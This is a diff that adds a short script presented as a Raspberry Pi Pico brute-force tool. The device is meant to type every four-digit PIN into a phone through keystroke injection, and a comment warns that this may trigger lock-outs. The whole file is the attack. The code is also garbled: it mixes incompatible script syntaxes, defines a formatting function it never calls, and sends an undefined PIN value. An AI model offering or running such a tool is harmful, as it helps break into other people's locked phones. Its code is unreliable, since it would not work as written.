@@ -1,0 +1,23 @@
+REM Raspberry Pi Pico 4-Digit PIN Brute Force Script
+REM WARNING: This may trigger phone security locks!
+
+DELAY 5000
+
+FOR i FROM 0 TO 9999
+    STRING %i
+    DELAY 1000
+    GUI
+NEXT
+
+REM Format numbers with leading zeros
+FUNCTION FormatPIN(num)
+    RETURN RIGHT("0000" & num, 4)
+END FUNCTION
+
+REM Main loop
+WHILE TRUE
+    FOR i = 0 TO 9999
+        SEND "{DELAY 500}"{PIN}
+        DELAY 1500
+    NEXT
+WEND
